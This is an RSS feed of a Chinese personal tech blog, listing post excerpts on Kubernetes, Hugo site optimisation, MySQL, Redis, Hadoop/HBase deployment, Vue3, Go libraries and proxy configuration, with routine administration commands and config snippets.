<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 老麦的书房</title><link>https://tangx.in/posts/</link><description>Recent content in Posts on 老麦的书房</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Tue, 03 Jan 2023 18:15:50 +0800</lastBuildDate><atom:link href="https://tangx.in/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Kubernetes 不同的升级策略是如何影响服务质量 QoS 的</title><link>https://tangx.in/posts/2023/01/03/kubernetes-upgrade-strategy-and-qos/</link><pubDate>Tue, 03 Jan 2023 18:15:50 +0800</pubDate><guid>https://tangx.in/posts/2023/01/03/kubernetes-upgrade-strategy-and-qos/</guid><description>Kubernetes 不同的升级策略是如何影响服务质量 QoS 的 Deployments#Strategy - Kubernetes 无论采取哪种升级方式, 都应该在容器中使用 probe , 降低业务抖动 Pod 升级策略 .spec.strategy.type 有两种方式可选: RollingUpdate : 滚动升级. .spec.strategy.rollingUpdate.maxUnavailable 最大不可用 , 默认 25% , 即升级期间, 总容器数量为 100%。 循环 删旧扩新 .spec.strategy.rollingUpdate.maxSurge 最大弹性, 默认 30% , 即升级期间, 总容器数量不超过 130%。 循环 扩新删旧</description></item><item><title>Pgsql数据库: psql 命令非交互式备份与恢复</title><link>https://tangx.in/posts/2023/01/02/pgsql-dump-and-restore/</link><pubDate>Mon, 02 Jan 2023 10:01:57 +0800</pubDate><guid>https://tangx.in/posts/2023/01/02/pgsql-dump-and-restore/</guid><description>Pgsql数据库: psql 命令非交互式备份与恢复 通常， 我们在使用 psql 命令的时候， 使用交互式命令， 输入密码， 保证安全。 1 2 3 4 5 # 备份 pg_dump -U root -h 172.17.101.250 -W -d intelliep_event &amp;gt; demo.sql # 登录 psql -U root -h 172.17.101.250 -W -d intelliep_event &amp;lt; demo.sql 非交互式操作 但是在 脚本 中执行备份和恢复的时候， 交互式的输入密码就非常不方便了。 要实现非交互式， 非常简单。 只需要</description></item><item><title>Hugo 网站优化(7): 把我图床搬到又拍云 (upyun) 了， 做图床真的很好用</title><link>https://tangx.in/posts/2023/01/02/hugo-use-upyun-cdn-for-static-site/</link><pubDate>Mon, 02 Jan 2023 09:09:37 +0800</pubDate><guid>https://tangx.in/posts/2023/01/02/hugo-use-upyun-cdn-for-static-site/</guid><description>Hugo 网站优化(7): 把我图床搬到又拍云了(upyun)， 做图床真的很好用 又拍云 CDN 附加功能很多， 作为资源站很爽。 原文链接: https://tangx.in/posts/2023/01/02/hugo-use-upyun-cdn-for-static-site/ 费用 又拍云有一个 联盟推广服务，需要在网站上挂又拍云的 LOGO，相当于广告费。 对联盟成员提供 10G 对象存储 15G 流量（支持 HTTPS) 点击我的 又拍云推广链接 , 注册并完成实名认证，即</description></item><item><title>Hugo 网站优化(6): 博客图片不能显示全怪 Adblock。 Referrer Policy: no-referrer-when-downgrade</title><link>https://tangx.in/posts/2023/01/01/no-referrer-when-downgrade-image/no-referrer-when-downgrade-image/</link><pubDate>Sun, 01 Jan 2023 21:45:51 +0800</pubDate><guid>https://tangx.in/posts/2023/01/01/no-referrer-when-downgrade-image/no-referrer-when-downgrade-image/</guid><description>Hugo 网站优化(6): 博客图片不能显示全怪 Adblock。 原文链接: https://tangx.in/posts/2023/01/01/no-referrer-when-downgrade-image/ 我在 博客 老麦的书房 上， 放了几个推广链接， 等待好心人帮我点一点。 但是今天换了一台电脑后， 发现推广链接突然不能显示了。 打开调试模式， 发现图片报红， 报错 Referrer Policy: no-referrer-when-downgrade 。 经过搜索， 提示发现这个是 浏览器的安全策略 ， 不能从 https 的网站访问</description></item><item><title>Linux 工具命令(02): shfmt 格式化 shell 脚本， vscode 神插件</title><link>https://tangx.in/posts/2022/12/30/vscode-shfmt/</link><pubDate>Fri, 30 Dec 2022 22:50:10 +0800</pubDate><guid>https://tangx.in/posts/2022/12/30/vscode-shfmt/</guid><description>Linux 工具命令(02): shfmt 格式化 shell 脚本， vscode 神插件 如果你用 Linux， 那你一定会遇到各种各样的 shell script（下称 script) 可惜的是， script 并没有一个 强制 约束的格式。 对于分支控制语句， 都有自己的关键字。 条件语句: if (...) then ... else ... fi 循环语句: for ... do ... done 等。 因此 是否使用 {statement} 或者 缩进 并不影响。 当分支语句多，且</description></item><item><title>Linux 基础命令(01): dos2unix 搞定 Linux 和 Windows 换行符的噩梦</title><link>https://tangx.in/posts/2022/12/29/dos2unix-and-unix2dos/</link><pubDate>Thu, 29 Dec 2022 18:21:00 +0800</pubDate><guid>https://tangx.in/posts/2022/12/29/dos2unix-and-unix2dos/</guid><description>大家好， 我是老麦 欢迎 关注公众号 Go与云原生 或 订阅网站 https://tangx.in/ 第一时间看后续精彩文章。 觉得好的话，请猛击文章右下角「在看」 一键三连， 是对我的最大支持。 原文链接: https://tangx.in/posts/2022/12/28/dos2unix-and-unix2dos/ Linux 基础命令(01): dos2unix 搞定 Linux 和 Windows 换行符的噩梦 不同操作系统 换行符 标准不统一， 秦始皇听了都要落泪。 多少年前， 我曾也被这东西坑过无数</description></item><item><title>从零开始写 k8s 发布工具（1） - kustz 介绍和设计思想</title><link>https://tangx.in/posts/2022/12/28/kustz-1-1-introduce/</link><pubDate>Wed, 28 Dec 2022 13:28:03 +0800</pubDate><guid>https://tangx.in/posts/2022/12/28/kustz-1-1-introduce/</guid><description>大家好， 我是老麦 欢迎 关注公众号 Go与云原生 或 订阅网站 https://tangx.in/ 第一时间看后续精彩文章。 觉得好的话，请猛击文章右下角「在看」 一键三连， 是对我的最大支持。 原文链接: https://tangx.in/posts/2022/12/28/kustz-1-1-introduce/ 介绍 如果要在 Kubernets 发布一个应用， 并对外提供服务， 需要配置诸如 Dep, Ing, Svc 等 Config API。 他们之间又是通过 Label 组合选择而实现的 松耦合。 如果想要这</description></item><item><title>Hugo 网站优化(5)： 穷的还剩 8 分钱， 还是再压缩一下图片节约流量吧</title><link>https://tangx.in/posts/2022/12/27/hugo-image-compress/</link><pubDate>Tue, 27 Dec 2022 16:15:12 +0800</pubDate><guid>https://tangx.in/posts/2022/12/27/hugo-image-compress/</guid><description>Hugo 网站优化(5)： 穷的还剩 8 分钱， 还是再压缩一下图片节约流量吧 大家好， 我是老麦 欢迎 关注公众号 Go与云原生 或 订阅网站 https://tangx.in/ 第一时间看后续精彩文章。 觉得好的话，请猛击文章右下角「在看」 一键三连， 是对我的最大支持。 我很穷， 穷的来只剩账户只有 8 分钱了。 所以我每天都在想怎么能继续降低成本， 毕竟</description></item><item><title>Hugo 网站优化(4)： 为了防盗链， 不得不部署了两个网站</title><link>https://tangx.in/posts/2022/12/27/hugo-cdn-http-referer/</link><pubDate>Tue, 27 Dec 2022 16:14:55 +0800</pubDate><guid>https://tangx.in/posts/2022/12/27/hugo-cdn-http-referer/</guid><description>Hugo 网站优化(4)： 为了防盗链， 不得不部署了两个网站 大家好， 我是老麦 欢迎 关注公众号 maitalking 或 订阅网站 https://tangx.in/ 。 第一时间看后续精彩文章。觉得好的话，请猛击文章右下角「在看」，感谢支持。 在 CDN 配置里面， 有一个 防盗链配置 ， 基本原理就是判断 http header 中的 referer 来源是否在白名单中。 最初我只添加了 tangx.in, *.tangx.i</description></item><item><title>Hugo 网站优化(3)： 我用 DnsPod 给网站实现了全球加速</title><link>https://tangx.in/posts/2022/12/27/hugo-dns-shunting/</link><pubDate>Tue, 27 Dec 2022 11:40:45 +0800</pubDate><guid>https://tangx.in/posts/2022/12/27/hugo-dns-shunting/</guid><description>Hugo 网站优化(3)： 我用 dnspod 给网站实现了全球加速 大家好， 我是老麦 欢迎 关注公众号 maitalking 或 订阅网站 https://tangx.in/ 。 第一时间看后续精彩文章。觉得好的话，请猛击文章右下角「在看」，感谢支持。 之前我们用 腾讯云CDN 加速了 https://tangx.in 在国内的访问。 虽然没必要， 但我还是想做到全球访问都很快。 诚然， 可以用 CDN 的全球加速功能， 但</description></item><item><title>Hugo 网站优化(2)： 使用腾讯云 CDN 加速网站</title><link>https://tangx.in/posts/2022/12/26/hugo-cdn/</link><pubDate>Mon, 26 Dec 2022 15:47:11 +0800</pubDate><guid>https://tangx.in/posts/2022/12/26/hugo-cdn/</guid><description>Hugo 网站优化(2)： 使用腾讯云 CDN 加速网站 大家好， 我是老麦 欢迎 关注公众号 maitalking 或 订阅网站 https://tangx.in/ 。 第一时间看后续精彩文章。觉得好的话，请猛击文章右下角「在看」，感谢支持。 通过 Hugo 编译成为静态文件之后， 使用 github page 发布。 网站虽然发布了， 但是资源还在 github.io 上，在国内访问还是很慢， 需要 CDN 加速访问。 兜兜转转调研</description></item><item><title>Hugo 网站优化(1)： 渲染 Markdown 图片引用地址</title><link>https://tangx.in/posts/2022/12/26/hugo-render-markdown-image-url/</link><pubDate>Mon, 26 Dec 2022 14:21:42 +0800</pubDate><guid>https://tangx.in/posts/2022/12/26/hugo-render-markdown-image-url/</guid><description>Hugo 网站优化(1)： 渲染 Markdown 图片引用地址 大家好， 我是老麦 欢迎 关注公众号 maitalking 或 订阅网站 https://tangx.in/ 。 第一时间看后续精彩文章。觉得好的话，请猛击文章右下角「在看」，感谢支持。 作为一个技术人员， 使用 Markdown 写文章确实很方便。 引用图片通常有如下三种 1 2 3 4 5 6 7 8 9 # 1. 相对路径 ![](image.png) # 本文不讨论 ![](./image.png) # 2. 工程目录绝对</description></item><item><title>Golang 配置并接入 Aliyun SLS Trace 服务</title><link>https://tangx.in/posts/2022/12/23/aliyun-sls-trace-configuration/</link><pubDate>Fri, 23 Dec 2022 18:49:12 +0800</pubDate><guid>https://tangx.in/posts/2022/12/23/aliyun-sls-trace-configuration/</guid><description>阿里云 SLS Trace 配置 阿里云提供了一个 SLS Trace 服务。 类似于 Jaeger， 可以提供服务的观测性。 入口： 日志服务 SLS -&amp;gt; Trace 服务， https://sls.console.aliyun.com/lognext/trace 创建新实例之后， 可以看到如下图 其中标记的 1，2，3 之后 授权 和 访问 需要用到的。 除了这几个参数之外， 还需要 logstore 名称， 可以理解为这个就是数据的真实位置。 创建 RAM 账号授权策略 经过测试</description></item><item><title>在 Docker 容器中设置时区原来这么简单</title><link>https://tangx.in/posts/2022/12/21/docker-container-set-timezone/</link><pubDate>Wed, 21 Dec 2022 20:49:12 +0800</pubDate><guid>https://tangx.in/posts/2022/12/21/docker-container-set-timezone/</guid><description>Docker 容器中设置时区 在 linux 中， 通过 /etc/timezone 这个文件设置。 可以通过如下命令 持久化 时区设置， 其中 Asia/Shanghai 是我们需要的时区。 1 cp -a /usr/share/zoneinfo/Asia/Shanghai /etc/timezone 容器中设置时区一直是独立于宿主机的。 可以通过挂载 /etc/timezone 的方式保持与宿主机时间一致。 1 docker run --rm -it -v /etc/timezone:/etc/timezone debian bash 这种方法只适合 本地的、简单的、临时的 容器。 容器有一个很重要的特点， 就是 一处</description></item><item><title>Redis 持久化方式 - RDB 和 AOF</title><link>https://tangx.in/posts/2022/03/28/redis-persistence-rdb-and-aof/</link><pubDate>Mon, 28 Mar 2022 18:19:59 +0800</pubDate><guid>https://tangx.in/posts/2022/03/28/redis-persistence-rdb-and-aof/</guid><description>Redis 持久化 Redis 持久化数据支持 AOF (append-only files) 和 Rdb (snapshot) 两种方式。 在为 Redis 选择硬盘的时候， 最好选择 SSD 高性能硬盘。 Redis 持久化的四种选择: RDB (Redis Database): 创建 快照， 将内存中的 当前数据 状态进行 全量备份 。 AOF (Append-Only File): 以 写入操作 的 操作日志 形式存储到备份文件中。 恢复数据时重放所有操作。 类似 Mysql 的 Binlog RDB + AOF: 兼顾了 RDB 和 AOF 的优点。 No persistence: 不进行</description></item><item><title>Redis 删除大 key 时候的注意事项</title><link>https://tangx.in/posts/2022/03/28/redis-delete-the-big-key/</link><pubDate>Mon, 28 Mar 2022 10:17:52 +0800</pubDate><guid>https://tangx.in/posts/2022/03/28/redis-delete-the-big-key/</guid><description>Redis 删除大 KEY 的注意事项 什么是 Redis 大 Key string 类型中的值大于 10kb hash, list, set, zset 中的元素超过 5000个 如何查找大 Key string 通过命令直接查找 1 redis-cli -h 127.0.0.1 -p6379 -a &amp;#34;YourPassword&amp;#34; --bigkeys 使用 RdbTools 工具 1 rdb dump.rdb -c memory --bytes 10240 -f redis.csv 怎么删除 Redis 中的 大 Key 风险点: 直接删除大 Key 会造成阻塞。 由于 redis 是 单线程 执行， 阻塞可能造成其他所有请求超时。 如果超时越来越多，则可能会</description></item><item><title>使用 systemd 启动 hbase master 和 regionserver</title><link>https://tangx.in/posts/2022/03/25/manage-hbase-by-systemd/</link><pubDate>Fri, 25 Mar 2022 18:48:08 +0800</pubDate><guid>https://tangx.in/posts/2022/03/25/manage-hbase-by-systemd/</guid><description>在使用 systemd 管理 HMaster 和 HRegionServer 的时候， 设置启动命令需要使用 foregrand_start 前台启动方式。 否则程序会自动退出。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # hbase-master.service.j2 [Unit] Description=hbase master [Service] User={{ username }} Group={{ username }} Environment=&amp;#34;JAVA_HOME=/data/bigdata/java&amp;#34; Environment=&amp;#34;HBASE_HOME={{ HBASE_DIR }}/hbase&amp;#34; WorkingDirectory={{ HBASE_DIR }}/hbase ExecStart={{ HBASE_DIR }}/hbase/bin/hbase-daemon.sh --config {{ HBASE_DIR }}/hbase/conf foreground_start master ExecStop={{ HBASE_DIR }}/hbase/bin/hbase-daemon.sh --config {{ HBASE_DIR }}/hbase/conf stop master Restart=on-success # Restart service after 10 seconds if the dotnet service crashes: RestartSec=10 KillSignal=SIGINT SyslogIdentifier=hbase-master [Install] WantedBy=multi-user.target 在前后台启动这一点上， systemd , supervisor 和 docker entrypoint 上是一样的</description></item><item><title>Zookepper Hadoop Hdfs Hbase 手工部署</title><link>https://tangx.in/posts/2022/03/25/zookepper-hadoop-hdfs-hbase-manual-install/</link><pubDate>Fri, 25 Mar 2022 18:31:20 +0800</pubDate><guid>https://tangx.in/posts/2022/03/25/zookepper-hadoop-hdfs-hbase-manual-install/</guid><description>172.16.0.20 hadoop001 172.16.0.106 hadoop002 172.16.0.240 hadoop003 1 2 3 4 5 cat &amp;gt;&amp;gt; /etc/hosts &amp;lt;&amp;lt;&amp;#34;EOF&amp;#34; 172.16.0.20 hadoop001 172.16.0.106 hadoop002 172.16.0.240 hadoop003 EOF 安装 java 1 2 3 4 5 6 7 8 9 10 11 12 13 mkdir -p /opt/modules &amp;amp;&amp;amp; cd $_ wget -c https://dl.example.com/jdk-8u201-linux-x64.tar.gz tar xf jdk-8u201-linux-x64.tar.gz mv jdk1.8.0_201/ /usr/local/ cat &amp;gt;&amp;gt; /etc/profile &amp;lt;&amp;lt;&amp;#34;EOF&amp;#34; export JAVA_HOME=/usr/local/jdk1.8.0_201 export PATH=$JAVA_HOME/bin:$PATH EOF source /etc/profile java -version 安装 zookeeper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 mkdir -p /opt/modules &amp;amp;&amp;amp; cd $_ wget -c https://dl.example.com/zookeeper-3.4.13.tar.gz tar xf zookeeper-3.4.13.tar.gz mkdir -p /data/bigdata mv zookeeper-3.4.13 /data/bigdata/zookeeper cd /data/bigdata/zookeeper/conf cat &amp;gt; zoo.cfg &amp;lt;&amp;lt;&amp;#34;EOF&amp;#34; tickTime=2000 initLimit=10 syncLimit=5 dataDir=/data/bigdata/data/zookeeper clientPort=2181 server.1=hadoop001:2888:3888 server.2=hadoop002:2888:3888 server.3=hadoop003:2888:3888 EOF mkdir -p /data/bigdata/data/zookeeper echo 3 &amp;gt; /data/bigdata/data/zookeeper/myid cd .. ./bin/zkServer.sh start 安装</description></item><item><title>easy vue3 - 02 Data Binding v Model and v Bind</title><link>https://tangx.in/posts/2022/03/22/easy-vue3-02-data-binding-v-model-and-v-bind/</link><pubDate>Tue, 22 Mar 2022 22:01:23 +0800</pubDate><guid>https://tangx.in/posts/2022/03/22/easy-vue3-02-data-binding-v-model-and-v-bind/</guid><description>Vue 中有两种数据绑定方式： v-bind 单向绑定: 数据只能从 data 流向页面 v-model 双向绑定: 数据不仅能从 data 流向页面， 还可以从页面流向 data. v-model 一般用在 表单类型元素 上 (ex, input, select)。 v-model 需要省略 v-model:value 中的 value ， 因为 v-model 默认收集的就是 value 值。 v-model:value 会提示错误: v-model argument is not supported on plain elements.vue(55) 1 2 3 4 5 6 7 8 9 10 11 &amp;lt;template&amp;gt; &amp;lt;h1&amp;gt;02 数据绑定 v-bind and v-model&amp;lt;/h1&amp;gt; 1. v-bind 数据单</description></item><item><title>easy vue3 - 00 使用 vite 初始化 vue3 项目</title><link>https://tangx.in/posts/2022/03/22/easy-vue3-00-initial-a-vue3-vite-project/</link><pubDate>Tue, 22 Mar 2022 07:29:16 +0800</pubDate><guid>https://tangx.in/posts/2022/03/22/easy-vue3-00-initial-a-vue3-vite-project/</guid><description/></item><item><title>easy vue3 - 01 模版语法</title><link>https://tangx.in/posts/2022/03/22/easy-vue3-01-template-syntax/</link><pubDate>Tue, 22 Mar 2022 07:19:34 +0800</pubDate><guid>https://tangx.in/posts/2022/03/22/easy-vue3-01-template-syntax/</guid><description>在 vue 中渲染变量通常有两种方式 插值语法， 又叫 胡子语法 ， 使用 {{ xxx }} 方式在 标签体 渲染变量 1 &amp;lt;h3&amp;gt;插值语法: {{ name }}&amp;lt;/h3&amp;gt; 指令语法 v-bind:attr=&amp;quot;xxxx&amp;quot;, v-bind 可以缩写为 冒号 :， attr 是 标签属性 名称； xxx 是属性标签值， 且 xxx 是 js 表达式 1 2 3 4 5 6 &amp;lt;h3&amp;gt;指令语法&amp;lt;/h3&amp;gt; &amp;lt;a :href=&amp;#34;url&amp;#34;&amp;gt; 百度一下 ( : ) &amp;lt;/a&amp;gt;</description></item><item><title>Gitlab 在不同 job 之间传递变量</title><link>https://tangx.in/posts/2022/03/04/pass-an-environment-variable-to-another-job/</link><pubDate>Fri, 04 Mar 2022 18:44:29 +0800</pubDate><guid>https://tangx.in/posts/2022/03/04/pass-an-environment-variable-to-another-job/</guid><description>在 gitlab 中， 不同 job 之间的变量是不能直接传递的。 但如果有需求， 则必须要借助 artifacts:reports:dotenv 实现。 在 job1 中保存在 script 下执行命令， 保存到 xxx.env 文件中。 将变量已 k=v 的形式保存 每行一个 不支持换行符 使用 artifacts:reports:dotenv 传递文件 在后续 job 中， 会自动加载 job1 传递 xxx.env 中的变量键值对。 另外如果在后续 job 中定义了同名变量，则这些变量值将被覆盖， 以 xxx.env 中</description></item><item><title>gorm 数据库表模型声明 - 基础</title><link>https://tangx.in/posts/2021/12/15/gorm-declaring-models-note/</link><pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/15/gorm-declaring-models-note/</guid><description>gorm 数据库表模型声明 - 基础 链接数据库 1 2 3 4 5 6 7 8 9 10 import ( &amp;#34;gorm.io/driver/mysql&amp;#34; &amp;#34;gorm.io/gorm&amp;#34; ) func main() { // refer https://github.com/go-sql-driver/mysql#dsn-data-source-name for details dsn := &amp;#34;user:pass@tcp(127.0.0.1:3306)/dbname?charset=utf8mb4&amp;amp;parseTime=True&amp;amp;loc=Local&amp;#34; db, err := gorm.Open(mysql.Open(dsn), &amp;amp;gorm.Config{}) } 常用字段类型与 gorm 默认字段类型 varchar, int, datetime, timestamp 表定义如下 1 2 3 4 5 type Author struct { gorm.Model Name string Password string } auto migrate 后， 可以看到 name, password 默认使用的是 longtext 类型。 1 2 3 4 5 6 7 8 9 10 11 12 show create table authors; CREATE TABLE `authors` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `created_at` datetime(3) DEFAULT NULL, `updated_at` datetime(3) DEFAULT</description></item><item><title>golang deepcopy 的两种实现方式</title><link>https://tangx.in/posts/2021/12/14/golang-struct-interface-deepcopy/</link><pubDate>Tue, 14 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/14/golang-struct-interface-deepcopy/</guid><description>golang deepcopy 的两种实现方式 最近在基于 gin 封装 rum-gonic - github web 框架的过程中，遇到了一个问题。 在注册路由的时候传递是 指针对象， 因此造成所有的 request 请求使用相同的 CreateUser 对象, 出现并发冲突。 1 2 3 4 5 6 7 8 9 func init() { RouterGroup_User.Register(&amp;amp;CreateUser{}) } type CreateUser struct { httpx.MethodPost `path:&amp;#34;&amp;#34;` Name string `query:&amp;#34;name&amp;#34;` Password string `query:&amp;#34;password&amp;#34;` } struct 结构体 deepcopy 的实现 基于 sturct 的实现， 由于有 明确 的 struct 对象结构， 通常直接创建一个</description></item><item><title>Mysql 外键</title><link>https://tangx.in/posts/2021/12/08/mysql-foreign-key/</link><pubDate>Wed, 08 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/08/mysql-foreign-key/</guid><description>Mysql 外键 如果说 mysql 中的 left/right/out join 查询 软链接 关系， 只是通过看似有关系的字段把两张表聚合在一起。 那么 foreign key 就是 硬连接 ， 实实在在把两张表聚合在一起。 如果数据的字段的值 不符合 所连接表， 将不允许输入 插入或修改 数据。 创建外键 准备环境 1 2 3 4 5 6 7 create database day123 default charset utf8 collate utf8_general_ci; use day123; create table depart( id int not null primary key auto_increment, name varchar(32) not null ) default charset=utf8; 创建</description></item><item><title>mysql 查询操作</title><link>https://tangx.in/posts/2021/12/07/mysql-select-operation/</link><pubDate>Tue, 07 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/07/mysql-select-operation/</guid><description>mysql 查询操作 初始化环境 创建数据库， 1 2 3 4 -- create database create database day111 default charset utf8 collate utf8_general_ci; use day111; 创建用户表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 -- create table user create table user ( id int not null primary key auto_increment, name varchar(6) not null, password varchar(32) not null, age int, salary int null default 0, depart_id int not null ) default charset=utf8; -- insert into `user` (name, `password`, age, salary,depart_id) values (&amp;#34;诸葛亮&amp;#34;,&amp;#34;zhuge123&amp;#34;,3</description></item><item><title>mysql table 操作</title><link>https://tangx.in/posts/2021/12/06/mysql-table-operation/</link><pubDate>Mon, 06 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/06/mysql-table-operation/</guid><description>Mysql - table 操作 创建数据库 1 create database 数据库名 default charset utf8 collate utf8_general_ci; 查看所有表 1 show tables; 创建数据表 1 2 3 4 5 6 7 8 9 10 11 12 13 create table 表名( 列名 类型, 列名 类型 ) default charset=utf8; --- create table user ( id int not null auto_increment primary key, -- 不允许为空，主键, 自增 name varchar(16) not null, -- 不允许为空 email varchar(32) null, -- 允许为空， 长度为 32 age int default 3 -- 默认值 ) default charset=urf8; 注意 : 一张表只能 有且只有一个 自增列</description></item><item><title>Mysql 常见数据类型 int char timestamp</title><link>https://tangx.in/posts/2021/12/06/mysql-data-type/</link><pubDate>Mon, 06 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/06/mysql-data-type/</guid><description>Mysql 数据类型 https://dev.mysql.com/doc/refman/5.7/en/data-types.html 整数类型 1 2 3 4 5 6 7 8 mysql root@localhost:db1&amp;gt; create table table_int( int_no int unsigned, biging_no bigint, tinyint_no tinyint ) default charset=utf8; Query OK, 0 rows affected Time: 0.028s int 取值范围 -2^31 ~ 2^31-1 unsigned : 取之范围 0 ~ 2^32-1 bigint 取值范围 -2^63 ~ 2^63-1 tinyint 取值范围 -128 ~ 127 小数类型 Float 使用 32位浮点数保存。 不精确。 Double 使用 64 位浮点数保存。 不精确。 Decimal decimal 精确的小数值， m 数字的总个数（负号部分不算， 含 小数部分）; d</description></item><item><title>Mysql 基础练习 01</title><link>https://tangx.in/posts/2021/12/06/mysql-basic-pratice-01/</link><pubDate>Mon, 06 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/06/mysql-basic-pratice-01/</guid><description>Mysql 基础练习 01 根据表格创建数据库表，注意编码。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 create database db01 default charset utf8 collate utf8_general_ci; use db01; create table userinfo ( id int not null auto_increment primary key, name varchar(32) not null, password varchar(64) not null, gender enum(&amp;#39;male&amp;#39;,&amp;#39;female&amp;#39;) not null, email varchar(64) not null, amount decimal(10,2) not null default 0, ctime datetime ) default charset=utf8; show tables; +----------------+ | Tables_in_db01 | +----------------+ | userinfo | +----------------+ 1 row in set 插入任意五条数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26</description></item><item><title>K8S 中被挂载的 Configmap 发生了变化容器内部会发生什么</title><link>https://tangx.in/posts/2021/12/02/configmap-mounting-scenario-when-updated/</link><pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/12/02/configmap-mounting-scenario-when-updated/</guid><description>K8S 中被挂载的 Configmap 发生了变化容器内部会发生什么 1. 使用 env 挂载 被挂载的值不会变 1 2 3 4 5 6 7 env: # 定义环境变量 - name: PLAYER_INITIAL_LIVES # 请注意这里和 ConfigMap 中的键名是不一样的 valueFrom: configMapKeyRef: name: game-demo # 这个值来自 ConfigMap key: player_initial_lives # 需要取值的键 使用 volumeMounts 挂载目录 在使用 volumeMounts 挂载的时候， 根据是否有 subpath 参数， 情况也不一样。 2.1 没有 subpath 挂载目录 1 2 3 volumeMounts: - name: config mountPath: &amp;#34;/config/normal-dir/some-path/&amp;#34;</description></item><item><title>gin 实现首页不缓存</title><link>https://tangx.in/posts/2021/11/26/index-no-cache-in-gin/</link><pubDate>Fri, 26 Nov 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/11/26/index-no-cache-in-gin/</guid><description>在 gin 中实现首页不缓存 之前提到了在 nginx 中添加响应头 Cache-Control: no-cache 不缓存首页， 以便每次发布 CDN 都能回源到最新的资源。 nginx 的配置可能都是实施人员的操作， 或许不在掌控范围内。 自己控制起来很简单， 无非就是加一个 Header 头嘛。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( &amp;#34;fmt&amp;#34; &amp;#34;github.com/gin-gonic/gin&amp;#34; ) func main() { r := gin.Default() // 一</description></item><item><title>配置文件初始化思路一二三</title><link>https://tangx.in/posts/2021/11/26/golang-project-config-initial-tips/</link><pubDate>Fri, 26 Nov 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/11/26/golang-project-config-initial-tips/</guid><description>配置文件初始化思路要点一二三 配置文件字段如下 1 2 3 4 type Config struct { Server Server `json:&amp;#34;server,omitempty&amp;#34; yaml:&amp;#34;server,omitempty&amp;#34;` Ingresses netv1.IngressSpec `json:&amp;#34;ingresses,omitempty&amp;#34; yaml:&amp;#34;ingresses,omitempty&amp;#34;` } 完整配置如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 server: port: 8080 ingresses: rules: - host: www.baidu.com http: paths: - backend: service: name: /search port: number: 80 pathType: ImplementationSpecific # pathType: Exact # pathType: Prefix Config 文件 读取多个文件后合并最终结果。 可以将不同的功能配置放在不同的文件中， 在数据内容多的情况下更有利于操作。</description></item><item><title>nginx 实现首页不缓存</title><link>https://tangx.in/posts/2021/11/25/index-no-cache-in-nginx/</link><pubDate>Thu, 25 Nov 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/11/25/index-no-cache-in-nginx/</guid><description>nginx 实现首页不缓存 前端上 CDN 加速， 后端上 DCDN， 加速网站访问速度。 前端代码编译的时候， 可以加上 hash 值使编译后的产物名字随机， 可以在不刷新 CDN 资源 的情况下， 保障页面展示最新。 虽然对多了一点回源， 但减少了人工操作。 但是 首页不能被缓存， 否则于事无补。 对于首页的缓存设置， 有一点注意事项， 其一 ，</description></item><item><title>v2ray 配置</title><link>https://tangx.in/posts/2021/11/19/v2ray-client-config/</link><pubDate>Fri, 19 Nov 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/11/19/v2ray-client-config/</guid><description>v2ray 配置 命令行快捷键 pxy=&amp;#39;http_proxy=http://127.0.0.1:7890 https_proxy=http://127.0.0.1:7890 $@&amp;#39; client.json 同时监听 socks5 和 http 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 { &amp;#34;log&amp;#34;: { &amp;#34;error&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;loglevel&amp;#34;: &amp;#34;info&amp;#34;, &amp;#34;access&amp;#34;: &amp;#34;&amp;#34; }, &amp;#34;inbounds&amp;#34;: [ { &amp;#34;listen&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;protocol&amp;#34;: &amp;#34;socks&amp;#34;, &amp;#34;settings&amp;#34;: { &amp;#34;udp&amp;#34;: false, &amp;#34;auth&amp;#34;: &amp;#34;noauth&amp;#34;</description></item><item><title>设置 docker server 网络代理</title><link>https://tangx.in/posts/2021/11/19/docker-server-network-proxy/</link><pubDate>Fri, 19 Nov 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/11/19/docker-server-network-proxy/</guid><description>如果在国内使用docker, 大家一般会配置各种加速器, 我一般会配置阿里云或腾讯云，还算比较稳定。 /etc/docker/daemon.json 配置如下 1 2 3 4 5 6 7 8 { &amp;#34;registry-mirrors&amp;#34;: [ &amp;#34;https://mirror.ccs.tencentyun.com&amp;#34;, &amp;#34;https://wlzfs4t4.mirror.aliyuncs.com&amp;#34; ], 